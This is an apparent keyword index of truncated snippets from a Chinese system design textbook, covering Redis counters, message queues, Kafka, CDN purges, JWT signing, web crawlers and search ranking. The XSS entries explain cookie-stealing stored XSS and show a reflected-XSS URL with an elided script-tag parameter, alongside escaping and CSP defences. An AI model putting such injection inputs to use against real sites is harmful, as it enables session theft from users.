  c11_b08.md: ...理协调。（这就是为什么我们在第 5 章说数据库值得用——它们解决了你自己难以解决的分布式协调问题。）  **Redis INCR：** `INCR post:101:likes`。Redis 单线程处理命令，所以 `INCR` 是原子的。多台应用服...
  c11_b08.md: ...什么我们在第 5 章说数据库值得用——它们解决了你自己难以解决的分布式协调问题。）  **Redis INCR：** `INCR post:101:likes`。Redis 单线程处理命令，所以 `INCR` 是原子的。多台应用服务器可同时安全调用...
  c11_b08.md: ...。）  **Redis INCR：** `INCR post:101:likes`。Redis 单线程处理命令，所以 `INCR` 是原子的。多台应用服务器可同时安全调用。  **乐观并发控制：** 读取当前计数和版本号，加 1，仅当版本号没变时写...

=== hashtags (5 occurrences) ===
  c06_b11.md: ...*  **关系型方案：**  Schema（加入 SocialSnap v1）：       CREATE TABLE hashtags (         post_id     INTEGER REFERENCES posts(id) ON DELET...
  c06_b11.md: ...P DEFAULT NOW()     );     CREATE INDEX idx_hashtags_tag ON hashtags(tag);     CREATE INDEX idx_hashtags_created_at ON hashtags(...
  c06_b11.md: ...hashtags(tag);     CREATE INDEX idx_hashtags_created_at ON hashtags(created_at);   热门 hashtag 查询：       SELECT tag, COUNT(*) as...
  c06_b11.md: ...热门 hashtag 查询：       SELECT tag, COUNT(*) as count     FROM hashtags     WHERE created_at > NOW() - INTERVAL '24 hours'     GROU...
  c06_b11.md: ...edis 有序集合默认持久性有限（需配置 AOF），且数据是反规范化的（帖子的 hashtag 存在两个地方：关系型 `hashtags` 表和 Redis 有序集合）。如果它们不同步（如 Redis 崩溃且未持久化），趋势计数会丢失，必须重建。  **这...

=== trending (5 occurrences) ===
  c16_b14.md: ...典型页面加载调用三个服务：User Service（获取登录用户资料）、Feed Service（获取用户 feed）、Trending Service（获取热门话题）。每个服务可用性（availability）99%。没有熔断器时页面加载成功概率是多少？...
  c16_b14.md: ...0.99 × 0.99 = 0.970。97.0%（97%）成功率——约 1.99% 页面加载失败。  使用熔断器并对 Trending Service 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 Use...
  c16_b14.md: ....0%（97%）成功率——约 1.99% 页面加载失败。  使用熔断器并对 Trending Service 优雅降级：Trending Service 失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Servi...
  c16_b14.md: ...失败只导致热门话题从页面省略，但页面加载成功。只要 User Service 和 Feed Service 成功，无论 Trending Service 如何，页面都加载成功。  User Service 和 Feed Service 同时成功的概率 =...
  c16_b14.md: ...都在）：0.99 × 0.99 × 0.99 = 97.0% * **降级但可用页面**（User + Feed 在线，Trending 失败）：0.99 × 0.99 × 0.01 = 0.98% * **页面完全失败**（User Service 或...

=== javascript (5 occurrences) ===
  c07_b02.md: ...缓存可以放在系统的多个层。理解放置选项和理解缓存本身一样重要。   #### 客户端缓存  浏览器在本地存储 CSS、JavaScript 和图片文件的副本。当你再次访问网站，浏览器从本地磁盘提供静态资源，而不是重新下载。HTTP 缓存头（`Cache-Co...
  c19_b07.md: ...“我们使用 JSON 而非 SQL”所以 API 层不会注入。  注入漏洞存在于用户输入到达解释器的任何地方——SQL、JavaScript、shell 命令、XML 解析器。原则始终相同：把代码与数据分开。   ### 19.5 零信任架构与密钥管理...
  c19_b12.md: ...他们的帖子内容中提交了 script 标签。当应用直接把这些内容插入 HTML 响应而不转义时，浏览器把它解释为可执行 JavaScript 而非显示文本。修复方法是在渲染到 HTML 前转义所有用户生成内容——把 `<` 转为 `&lt;`、`>` 转为 `...
  c23_b05.md: ...爬取页面到达后，索引流水线执行多次转换：  1. **解析：** 从原始 HTML 提取干净文本。移除 HTML 标签、JavaScript、CSS。 2. **分词：** 把文本切分成单个 token（词）。 3. **归一化：** 转小写；去除标点。"Di...
  c28_b06.md: ...中心，边缘计算在 CDN 边缘节点运行应用逻辑——正是提供缓存内容的服务器。来自东京的请求可以由在东京边缘服务器运行的 JavaScript/WebAssembly 代码处理，延迟低于 1 毫秒（sub-millisecond）。  这之所以可能，是因为现代...

=== fifo (5 occurrences) ===
  c07_b06.md: ...时比 LRU 更好（上周流行且今天仍然流行的数据项应该保留；LRU 可能因为它在过去一小时内没被访问而驱逐它）。  **FIFO（First In, First Out，先进先出）：** 驱逐最老的条目。简单但实践中常较差——很久以前加入的条目可能...
  c08_b02.md: ...），队列存储全部 10,000 个。邮件服务以自己能处理的速率工作，逐渐消化积压。  **顺序：** 大多数队列大致按 FIFO（先进先出）顺序投递消息，但在故障下保证完全 exactly-once 顺序很难。   ### 8.3 投递保证——最多...
  c23_b09.md: ...#### 概念检测  **Q1.** 什么是 URL frontier，为什么它比简单 FIFO 队列更复杂？  **答案：** URL frontier 是爬虫的调度数据结构——决定接下来获取哪些 URL、以什么顺...
  c23_b09.md: ...答案：** URL frontier 是爬虫的调度数据结构——决定接下来获取哪些 URL、以什么顺序、以什么速率。简单 FIFO 队列不足，原因有三：(1) 它会让爬虫向单个域名发送大量并行请求，压垮该域服务器。URL frontier 用 per...
  c23_b09.md: ...略（每个域名一次一个请求，可配置延迟）。(2) 有些页面更重要，应优先爬取（高 PageRank 域名、频繁更新站点）。FIFO 队列平等对待所有 URL；URL frontier 使用优先级机制。(3) frontier 必须集成重复检测，避免把...

=== hashing (5 occurrences) ===
  c07_b06.md: ...你存字符串，取字符串。没有数据类型、没有持久化、没有复制（基础版）。Memcached 集群使用 consistent hashing 跨节点分区数据（我们将在第 9 章研究）。如果一个节点失败，其数据丢失。  **最适合：** 简单、高容量的缓存，你只...
  c25_b10.md: ...500,000 × 3 = 150 万（1.5M）。集群设计：3–4 个 Redis 节点，使用 consistent hashing（第 9 章）跨节点，每节点一个副本以保证可用性。每节点 375,000–500,000 操作/秒——在单节点限制内且有...
  c28_b11.md: ...ad balancing** (Ch 9) | 避免慢后端而更低 | N/A | 高 | 低 **Consistent hashing (load balancer)** (Ch 9) | 无延迟开销；缓存亲和收益 | N/A | 高（变更时最小重映射）...
  c28_b12.md: ...分片内强；跨分片困难 | 高——分片故障影响 1/N 数据 | 高——跨分片查询、重分片痛苦 **Consistent hashing (DB)** (Ch 12, 26) | 无延迟成本；最小迁移 | N/A | 高——拓扑变更时最小扰动 | 中 **...
  c28_b14.md: ...计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈值管理、两条代码路径 **Consistent hashing + virtual nodes** (Ch 26) | 无延迟成本 | N/A | 极高（变更时最小扰动） | 中 *...

=== out (5 occurrences) ===
  c07_b15.md: ...可选，用于改善新鲜度）。_ 当名人（粉丝 >10,000）发帖时，**不要**把 10,000+ 粉丝缓存全部 fan-out 失效——这正是 Think Deeper 里提到的惊群问题。相反，让这些缓存按 TTL 自然过期。对普通用户（粉丝 <...
  c08_b11.md: ...理。Pub-sub 会给每个 worker 自己的订阅，十个 worker 都会发送每封邮件。  常见组合：在 fan-out 层用 pub-sub（一个事件 → 多个消费者），在每个消费者类型内部用点对点（该类型的多个 worker 共享一个队...
  c28_b14.md: ...ol** (Ch 26) | 无延迟开销 | 最终（传播延迟） | 极高（无中央协调器 SPOF） | 低 **Fan-out on write** (Ch 22) | 读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用...
  c28_b14.md: ...读极低（预计算） | 最终（feed 新鲜前有扇出延迟） | 高（读始终可用） | 中–高（扇出基础设施） **Fan-out on read** (Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **...
  c28_b14.md: ...(Ch 22) | 读高（读时计算） | 强（读时始终最新） | 中（读需要多次取） | 低 **Hybrid fan-out** (Ch 22) | 低（预计算 + 按需结合） | 普通用户最终；名人近实时 | 高 | 高——阈值管理、两条代码...

=== cloud (5 occurrences) ===
  c08_b04.md: ...# 8.5 Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与传统队列根本不同——也因为...
  c08_b05.md: ...储；保留太短暂无法重放。  对更简单的用例（单个消费者从队列读取），托管服务如 Amazon SQS 或 Google Cloud Pub/Sub 通常是正确选择。Kafka 在你需要高吞吐、多个独立消费者组或事件重放能力时才配得上它的复杂度。...
  c08_b16.md: ...独立消费者组或超过托管队列的吞吐时，Kafka 才配得上它的复杂度。当你只需要简单的“后台执行这个任务”时，SQS 或 Cloud Pub/Sub 等托管队列是正确选择。...
  c10_b03.md: ...VMe SSD、HDD） * 云块存储卷：Amazon EBS（Elastic Block Store）、Google Cloud Persistent Disk、Azure Managed Disk * SAN（Storage Area Netwo...
  c28_b04.md: ...时间付费，而不为空闲服务器时间付费。  plain 语言：你写一个函数，上传到 AWS Lambda 或 Google Cloud Functions。请求来时，云 provider 在需要的基础设施上运行你的函数，自动扩展以处理更多请求，并按毫秒执...

=== sqs (5 occurrences) ===
  c08_b04.md: ...无需改动）。   ### 8.5 Kafka——分布式日志  生产中有多种消息队列系统：RabbitMQ、Amazon SQS、Google Cloud Pub/Sub、Apache Kafka。其中 Kafka 值得特别对待，因为它的设计哲学与...
  c08_b05.md: ...置保留期——保留太久消耗存储；保留太短暂无法重放。  对更简单的用例（单个消费者从队列读取），托管服务如 Amazon SQS 或 Google Cloud Pub/Sub 通常是正确选择。Kafka 在你需要高吞吐、多个独立消费者组或事件重放能...
  c08_b16.md: ...0 秒/天 × 7 天 ≈ 1.2 TB Kafka 存储。3 倍复制下就是 3.6 TB。  对一个用 Amazon SQS 做更简单用例（后台邮件发送任务队列）的团队，SQS 在中等规模下成本几乎为零——消息消费即删除，任何时刻队列深度最多几...
  c08_b16.md: ...存储。3 倍复制下就是 3.6 TB。  对一个用 Amazon SQS 做更简单用例（后台邮件发送任务队列）的团队，SQS 在中等规模下成本几乎为零——消息消费即删除，任何时刻队列深度最多几千条。迁移到 Kafka 需要规划分区数、调整保留期...
  c08_b16.md: ...件重放、多个独立消费者组或超过托管队列的吞吐时，Kafka 才配得上它的复杂度。当你只需要简单的“后台执行这个任务”时，SQS 或 Cloud Pub/Sub 等托管队列是正确选择。...

=== signup (5 occurrences) ===
  c08_b07.md: ...Redis 支撑的持久队列）——还不是 Kafka，但原理相同。  新注册流程：       User submits signup form         ↓     Application Server (HTTP handler)...
  c08_b07.md: ...SQL (REQUIRED — user must exist)         ↓ 2. Publish "user.signup" event to message queue (fast, ~2ms)         ↓     Return H...
  c08_b07.md: .....)     Queue Consumer: Email Service         ← reads "user.signup" event from queue         ← sends welcome email (300ms — do...
  c08_b07.md: ...Queue Consumer: Analytics Service         ← reads "user.signup" event from queue         ← logs the event (50ms — doesn't...
  c08_b07.md: ...onsumer: Contact Notification Service         ← reads "user.signup" event from queue         ← notifies connected friends (200...

=== liked (5 occurrences) ===
  c08_b12.md: ...**答案：**  **事件 schema：**       {       "event_type": "post.liked",       "event_id": "evt_a7f2b9c1",       "timestamp": "202...
  c08_b12.md: ...ce 点赞帖子时，服务器：  1. 在 `likes` 表中插入一行（含 `like_id`） 2. 发布 `post.liked` 事件到消息队列 3. 向 Alice 的客户端返回 HTTP 200  **消费者：** 通知服务，读取 `post...
  c08_b12.md: ...事件到消息队列 3. 向 Alice 的客户端返回 HTTP 200  **消费者：** 通知服务，读取 `post.liked` 事件并：  1. 为 Bob（`user_id=7`）创建通知记录 2. 如果 Bob 在线，推送通知计数更新（通过...
  c08_b12.md: ...产安全的幂等消息处理方法。  **Q2.**（联系第 7 章陈旧性讨论）SocialSnap 工程团队争论：“post liked”通知消费者更新 Redis 计数器（`user:{user_id}:notification_count`）以在 UI...
  c08_b14.md: ...口的事件。  **架构修复——事件过期元数据：**       {       "event_type": "post.liked",       "event_id": "evt_abc123",       "timestamp": "2024-...

=== add (5 occurrences) ===
  c10_b06.md: ...把照片作为 bytea（blob）列存在 PostgreSQL 中**       ALTER TABLE users ADD COLUMN profile_photo BYTEA;   这对少量用户有效。大规模下多方面失败：  * Postgr...
  c14_b07.md: ...一次点赞递增，最终通过合并计算总数。  **OR-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 r...
  c14_b07.md: ...-Set（Observed-Remove Set）：** 一种同时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 remove 同一个元素；CRDT 的合并操作会产...
  c14_b07.md: ...时支持 add 和 remove 的集合，设计上让并发 add 和 remove 操作能确定性地解决。两个节点可以同时 add 和 remove 同一个元素；CRDT 的合并操作会产生定义好的、一致的结果。  CRDT 用灵活性换取一致性保证。不...
  c23_b02.md: ...ot in seen_set:         queue.enqueue(url)         seen_set.add(url)  100 亿（10 billion）URL 时，seen set 是 100 亿 URL 字符串。精确存入内...

=== spark (5 occurrences) ===
  c10_b07.md: ...S 不支持原地更新。文件写入一次，然后只读。这种简化实现高吞吐。  **数据本地性：** 计算（MapReduce 或 Spark 作业）在与数据相同的节点上运行。不是把数据移到计算，而是把计算移到数据，消除大数据集的网络瓶颈。  **HDFS 适用...
  c10_b07.md: ...HDFS 适用场景：** 大数据分析管道。一家公司把 10 TB 每日用户事件日志存在 HDFS 中。 nightly Spark 作业读取整个数据集以生成推荐。一次读取、高吞吐模式正是 HDFS 所优化的。  **HDFS 不适用场景：** 随机访...
  c10_b07.md: ...nap 后来在其用户事件流（点击、浏览、点赞）上构建 PB 级分析管道，HDFS 或云等价物（Amazon S3 用作 Spark 作业的类 HDFS 对象存储）就会变得相关。...
  c10_b08.md: ...，即使输入数据很大。与其把 100 万行运到应用服务器计数，不如数据库内部计数并返回一个数字。  这一原则可以扩展：在 Spark 集群中，计算任务调度到持有待处理数据块的节点上。当某计算节点处理完本地数据需要更多时，才会向其他节点请求——但这是例外...
  c10_b18.md: ...nalytical Processing）数据库。例子：Amazon Redshift、Google BigQuery、Spark 或 Trino 查询的 Apache Parquet 文件、ClickHouse。  列式存储把每列单独写。对上述查询...

=== pending (5 occurrences) ===
  c10_b11.md: ...单管理。订单包含结构化数据（客户 ID、商品、价格、送货地址、状态）。需要复杂查询：“显示过去 24 小时内所有状态为 pending、总额超过 500 USD 的订单，并与客户送货偏好 join。”这些查询跨多张表，需要索引和 join。延迟要求是个位...
  c15_b08.md: ...ment.charge.succeeded', '{"user_id": 42, "amount": 9.99}', 'pending');     COMMIT;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程...
  c15_b08.md: ...T;   事务保证：要么支付记录和 outbox 记录都保存，要么都不保存。消息中继（后台进程）查询 outbox 中 pending 事件并发布到消息队列，然后标记为已发送。如果中继在标记已发送前崩溃，它重试——并且由于消息队列支持幂等消费（消息按消息...
  c15_b12.md: ...用户”Saga：  **触发：** “关注”按钮的 HTTP 处理器收到请求。在 API Gateway 数据库中插入 pending 的 `follow_request` 记录，并通过 Outbox 模式发布 `follow.requested` 事件...
  c18_b12.md: ...kill 并重启时，Feed Service 在 Auth Service 不可用的 15 秒内堆积了 5000 个 pending 请求，Auth Service 恢复后 Feed Service 同时尝试处理这 5000 个请求，压垮它并导致二次失...

=== video (5 occurrences) ===
  c10_b13.md: ...123.mp4`。 5. 对象存储触发事件（通过 SNS/webhook），或上传完成信号通知应用服务器，服务器发布 `video.uploaded` 事件到消息队列（第 8 章）。  **转码路径（异步，通过消息队列）：**       消息队列事...
  c10_b13.md: ...。  **转码路径（异步，通过消息队列）：**       消息队列事件：{       "event_type": "video.uploaded",       "user_id": 42,       "raw_key": "raw-uploa...
  c10_b13.md: ...PostgreSQL 的 `videos` 表：标记视频状态为 `status = "ready"`。 5. 发布 `video.transcoding_complete` 事件给任何下游消费者（通知上传者、搜索索引更新等）。  多个转码 work...
  c28_b14.md: ...* (Ch 23) | N/A | 最终（网络持续被抓取） | 高（分布式爬虫） | 高——礼貌性、去重、优先队列 **Video transcoding pipeline** (Ch 24) | 高（离线批量；非实时） | 最终（上传到可用有延迟）...
  intro.md: ...务：sharded databases（分片数据库）、circuit breakers（熔断器）、CDN-backed video delivery（由 CDN 支持的视频分发），以及 200 台由 Terraform 管理的服务器。你会看到它在负载...

=== purge (5 occurrences) ===
  c10_b15.md: ...再请求它。CDN 中旧 URL 条目会简单地通过 TTL 过期（对不可变媒体文件通常设为小时或天）。不需要主动 CDN purge，因为 URL 已经改变。...
  c10_b16.md: ...变。给定 URL 处的媒体文件永远不会变化——因此无限 TTL 是正确的。缓存失效通过改变 URL 实现，而不是过期或 purge 现有缓存条目。这是 CDN 和 Web 框架对静态资源做指纹化（fingerprinting）的相同原则（例如 `ap...
  c24_b05.md: ...编码）时，平台必须使全球每个边缘服务器上的缓存副本失效。  这是第 7 章缓存失效问题放大到全球规模。CDN 厂商提供 purge API——向 CDN 控制面发送请求，它会向全球边缘服务器传播 purge 命令。传播通常在数秒到数分钟内完成。  对...
  c24_b05.md: ...存失效问题放大到全球规模。CDN 厂商提供 purge API——向 CDN 控制面发送请求，它会向全球边缘服务器传播 purge 命令。传播通常在数秒到数分钟内完成。  对视频流，更简单的方法是 URL 版本化：与其失效 URL，不如用编码版本或内...
  c24_b10.md: ...小时），但由于所有新会话都使用 v2 URL，v1 缓存条目自然老化。若需立即移除（如法律下架），平台调用显式 CDN purge API，在数分钟内把删除命令传播到所有边缘服务器。  **Q3.** 你在为视频平台设计存储层级策略。某视频在上传后前...

=== secret (5 occurrences) ===
  c11_b06.md: ...—会话数据：user_id、username、roles、过期时间） 3. 一个 **signature**（服务器用 secret key 生成的加密签名）  服务器在登录时签发 JWT：  1. 创建 payload：`{"user_id": 42...
  c11_b06.md: ...user_id": 42, "username": "alice", "exp": 1709510400}` 2. 用 secret key 签名：`HMACSHA256(base64(header) + "." + base64(payload),...
  c11_b06.md: ...s 查找相比，这是 0ms 网络延迟。  **水平扩展：** 任何服务器都能验证任何 JWT，因为所有服务器共享同一个 secret key（或使用公钥密码学：验证 key 共享，签名 key 私有）。不需要共享会话状态。  **可移植：** JWT...
  c11_b06.md: ...撤销列表”（被撤销 token ID 的集合）——但你重新引入了对 Redis 的依赖，部分抵消了无状态收益 * 轮换 secret key——让所有用户的所有 token 失效（强制全局登出）  这些 workaround 都不如 Redis 里的...
  c11_b12.md: ...d（user ID、username、过期时间等）包含在 token 自身中。服务器在登录时创建 payload 并用 secret key 签名。后续请求中，服务器通过重新计算签名并比对来验证 JWT——无需外部存储查找。  **它解决的问题：**...

=== complete (5 occurrences) ===
  c15_b13.md: ...ep: "PAYMENT_PENDING" | "USER_PENDING" | "EMAIL_PENDING" | "COMPLETE" | "COMPENSATING" | "FAILED"     payment_idempotency_key: "...
  c15_b13.md: ...ING`。调用 Notification Service。等待。 4. 邮件已发：设置 `current_step = COMPLETE`。返回成功给轮询客户端。  **失败场景 (a)：支付扣款失败。** Payment Service 返回错误（无效卡...
  c15_b13.md: ...`。向客户端返回错误：“您的升级未能完成。任何已扣款项已退款。”  **失败场景 (c)：所有步骤成功后，编排器在标记 COMPLETE 前崩溃。** 重启后，编排器的恢复进程查询所有 `current_step != COMPLETE AND curre...
  c15_b13.md: ...功后，编排器在标记 COMPLETE 前崩溃。** 重启后，编排器的恢复进程查询所有 `current_step != COMPLETE AND current_step != FAILED` 的 saga。它发现 `saga_7f3a9b2c` 仍处于...
  c15_b13.md: ...fication Service 的幂等检查返回“已发送”而不发送重复邮件。编排器设置 `current_step = COMPLETE`。Saga 正确完成。  **关键设计决策：**  * 发起调用前先持久化状态转换（以便崩溃恢复知道当前位置）。 *...

=== debug (5 occurrences) ===
  c17_b04.md: ...时区。来自不同服务的日志时间戳必须可比；时区歧义会造成抓狂的调试会话。 2. **Severity level**——DEBUG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DE...
  c17_b04.md: ...UG、INFO、WARN、ERROR、FATAL。级别让你过滤噪声：生产环境通常只看 INFO 及以上；调试时临时开启 DEBUG。 3. **Service and version**——哪个服务产生这条日志，以及运行代码的哪个版本。当 bug 部...
  c17_b05.md: ...#### 实践中的日志级别  DEBUG 日志详尽。数据库服务中，DEBUG 日志可能记录执行的每条 SQL。API 处理器中，可能记录每个请求的每个 head...
  c17_b05.md: ...#### 实践中的日志级别  DEBUG 日志详尽。数据库服务中，DEBUG 日志可能记录执行的每条 SQL。API 处理器中，可能记录每个请求的每个 header。开发和调试时 invaluab...
  c17_b05.md: ...发和调试时 invaluable，但生产环境产生巨大体量——通常是 INFO 日志的十到一百倍。大多数生产系统默认关闭 DEBUG，只在调试特定服务时按需开启。  INFO 日志记录正常、预期但有意义粒度的事件：“用户登录”、“支付处理完成”、“ke...

=== xss (5 occurrences) ===
  c19_b06.md: ...个浏览器中执行。脚本窃取查看用户的会话 cookie 并发送到攻击者服务器。然后攻击者可冒充该用户。  这是**存储型 XSS**（恶意脚本存储在数据库中，任何用户查看时执行）。它极具破坏力，因为一次发帖就能破坏数千用户。  **反射型 XSS*...
  c19_b06.md: ...XSS**（恶意脚本存储在数据库中，任何用户查看时执行）。它极具破坏力，因为一次发帖就能破坏数千用户。  **反射型 XSS** 类似，但使用 URL 参数：恶意链接如 `socialsnap.com/search?q=<script>...<...
  c19_b06.md: ...;`——浏览器把它显示为字面文本而非执行。现代框架（React、Vue、Angular）默认转义用户内容，因此大幅降低 XSS 风险。危险发生在开发者明确选择不转义时：React 中的 `dangerouslySetInnerHTML` 之所以这...
  c19_b06.md: ...eader，指示浏览器只执行可信来源的脚本（`script-src 'self'` 意味着只执行同源的脚本）。即使注入 XSS payload，CSP 也阻止其加载外部脚本。...
  c19_b17.md: ...磁盘被盗或未经授权的数据库访问）。密码不被加密——它们用故意很慢的算法哈希。  三种经典 Web 漏洞——SQL 注入、XSS、CSRF——都共享一个根因：把用户输入当作可信代码或可信状态。防御措施——参数化查询、HTML 转义、CSRF tok...

=== delivered (5 occurrences) ===
  c21_b08.md: ...#### 投递状态机  每条消息经历状态转换：      SENT → DELIVERED → READ  * **SENT：** 发送者客户端把消息提交到服务器。服务器已持久化。 * **DELIVERED：...
  c21_b08.md: ...DELIVERED → READ  * **SENT：** 发送者客户端把消息提交到服务器。服务器已持久化。 * **DELIVERED：** 接收者客户端收到消息（客户端通过 WebSocket 发送投递确认）。 * **READ：** 接收者打开对话，...
  c21_b08.md: .... 服务器通过 S3 上的 WebSocket 把消息 M 投递给接收者 R 2. 接收者客户端发送 `{type: "delivered", message_id: M}` 回 WebSocket 3. S3 收到该确认并写数据库：`UPDATE mess...
  c21_b13.md: ...的 UI 出现双勾的完整事件序列，包括所有网络调用、数据库写入和服务器间通信。  提示  追踪投递状态机：SENT → DELIVERED → READ。每个状态转换都需要一次数据库写入和一个实时事件回发发送者。思考连接服务器在步骤间崩溃会怎样。  **答案...
  c21_b13.md: ...回 S1 → S1 推送给 A 的客户端。 5. A 的客户端更新 M456 显示单勾（已发送到服务器）。  **状态：DELIVERED** 6. 消息服务在注册表查 B 的连接服务器：`GET user:B:server` → S3。 7. 消息服务经服...

=== crawl (5 occurrences) ===
  c23_b02.md: ...爬、哪些不可以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令...
  c23_b02.md: ...elay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令和 crawl 延迟。这不仅是礼貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **URL fronti...
  c23_b02.md: ...爬、哪些不可以以及速率。      User-agent: *     Disallow: /private/     Crawl-delay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令...
  c23_b02.md: ...elay: 2  设计良好的爬虫在爬某域名任何页面前先读取 `robots.txt`，并遵守 disallow 指令和 crawl 延迟。这不仅是礼貌，还有法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **URL fronti...
  c23_b03.md: ...优先队列**，按估计重要性排序 URL（重要 URL 先爬） 3. **调度层**，选择下一个从哪个域名队列拉取，遵守 crawl 延迟  plain 语言：URL frontier 是爬虫的待办清单，组织方式是重要工作先做，但没有任何单个网站被我们...

=== wikipedia (5 occurrences) ===
  c23_b02.md: ...须跟随这些链接。  这是最简单的爬虫，已包含所有正确思想：      seed_urls = ["https://en.wikipedia.org", "https://nytimes.com", ...]     queue = Queue(seed_ur...
  c23_b02.md: ...接，并将它们加入队列供后续处理。  但考虑这个最简单爬虫立即遇到的问题。  **重复问题。** 许多页面互相链接。如果 Wikipedia 链接到纽约时报，纽约时报又链回 Wikipedia，我们的爬虫会再次把 Wikipedia 加入队列并爬第二次——然后...
  c23_b02.md: ...爬虫立即遇到的问题。  **重复问题。** 许多页面互相链接。如果 Wikipedia 链接到纽约时报，纽约时报又链回 Wikipedia，我们的爬虫会再次把 Wikipedia 加入队列并爬第二次——然后无限循环。队列变成无限。  解决方案是 **seen...
  c23_b02.md: ...* 许多页面互相链接。如果 Wikipedia 链接到纽约时报，纽约时报又链回 Wikipedia，我们的爬虫会再次把 Wikipedia 加入队列并爬第二次——然后无限循环。队列变成无限。  解决方案是 **seen set** —— 所有已访问 URL...
  c23_b03.md: ...单，组织方式是重要工作先做，但没有任何单个网站被我们的请求压垮。   #### 优先爬取什么？  并非所有网页同等重要。Wikipedia 更新频繁且被数百万页面链接；2008 年后未更新的个人博客很少变化。爬取频率应反映内容价值和变化频率。  简单优先级启...

=== domain (5 occurrences) ===
  c23_b02.md: ...部容量。这称为 **爬取速率限制** 或 **礼貌** 问题。  解决方案是按域名限速爬取请求。每个域名有 **per-domain 队列**：每个域名一次只取一个 URL，请求之间设可配置延迟（例如 1 秒）。机器人遵守 `robots.txt`——...
  c23_b02.md: ...法律意义：忽略 `robots.txt` 可能让公司承担法律责任。  **URL frontier 设计。** per-domain 队列、礼貌控制和优先级（某些页面更重要，应优先爬取）的组合称为 **URL frontier**。URL fronti...
  c23_b03.md: ...的组件。设计良好的 URL frontier 具备：  1. **多队列**，通常每个域名或域名组一个，以执行 per-domain 爬取速率 2. **优先队列**，按估计重要性排序 URL（重要 URL 先爬） 3. **调度层**，选择下一个从哪...
  c23_b03.md: ...发送 HTTP 请求。实际上，URL frontier 的调度和礼貌逻辑比抓取本身更工程密集。速率限制（限流）、per-domain 队列、`robots.txt` 合规、重复检测和重新爬取调度共同构成生产爬虫的大部分复杂度。  * * *...
  c23_b09.md: ...队列不足，原因有三：(1) 它会让爬虫向单个域名发送大量并行请求，压垮该域服务器。URL frontier 用 per-domain 队列执行礼貌策略（每个域名一次一个请求，可配置延迟）。(2) 有些页面更重要，应优先爬取（高 PageRank 域名、...

=== frequency (5 occurrences) ===
  c23_b04.md: ...生产倒排索引在 posting list 中存的远不止文档 ID。典型 posting 包含：  * **Term frequency (TF)：** 该词在文档中出现多少次？提到 "distributed systems（分布式系统）" 50 次的文档...
  c23_b06.md: ...档都提到 "systems" 50 次呢？"systems" 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)...
  c23_b06.md: ..." 太常见，高频几乎不能说明什么。  TF-IDF（Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能对文档很重要。如果...
  c23_b06.md: ...Term Frequency - Inverse Document Frequency）的直觉是：  * **Term Frequency (TF)：** 一个词在文档中出现很多次，可能对文档很重要。如果 "consistency" 在文档中出现 30 次，...
  c23_b06.md: ..."consistency" 在文档中出现 30 次，该文档很可能讲一致性。 * **Inverse Document Frequency (IDF)：** 一个词在极少文档中出现，它出现时就是强信号。如果 "zkSNARK" 在 100 亿（10 bill...

=== based (5 occurrences) ===
  c23_b05.md: ...distributed systems（分布式系统）" 必须命中两个分片（每个词一个），然后求交集。这叫 **term-based sharding**。  **按文档分片：** 每个分片拥有所有文档的一个子集，并为其文档子集维护完整的小型倒排索引。...
  c23_b05.md: ...distributed systems" 并行命中所有分片；每个分片返回本地结果；结果合并。这叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它允许最自然的...
  c23_b05.md: ...结果合并。这叫 **document-based sharding**。  实践中，大型搜索引擎使用 document-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based s...
  c23_b05.md: ...t-based sharding，因为它允许最自然的并行：查询同时发往所有分片，每个分片并行产生结果，再合并。Term-based sharding 会产生倾斜问题（有些词远比其他词常见，造成热分片）且多词查询需要跨多个分片协调。  * * *...
  c23_b10.md: ...ng list 中的偏移）是 comparatively 小的额外结构。  **Q2.** 一个使用 document-based sharding 的搜索引擎有 100 个分片，每个分片持有 1 亿（100 million）页。用户提交一个 3 词...

=== dist (5 occurrences) ===
  c23_b07.md: ...结果质量打分，模型学习预测这些评分。  * * *   ### 23.4 查询处理与 Typeahead  用户输入 "dist" 到搜索框，下拉框立即显示 "distributed systems（分布式系统）"、"distance learni...
  c23_b07.md: ...在同一搜索框输入，typeahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist" 开头的前 10 个最频繁搜索查询就是建议。  前缀查找的数据结构是 **trie** ——...
  c23_b07.md: ...eahead 看到巨大查询量。  Typeahead 数据源是查询历史：用户以前搜索过什么以 "dist" 开头？以 "dist" 开头的前 10 个最频繁搜索查询就是建议。  前缀查找的数据结构是 **trie** —— 一种树，每条边代表一个字...
  c23_b07.md: ...数据结构是 **trie** —— 一种树，每条边代表一个字符，每个节点代表一个前缀，叶节点包含完整词。要找到所有以 "dist" 开头的查询，遍历 trie 到代表 "dist" 的节点并返回所有补全。  网络规模下，所有查询的单个 trie 太...
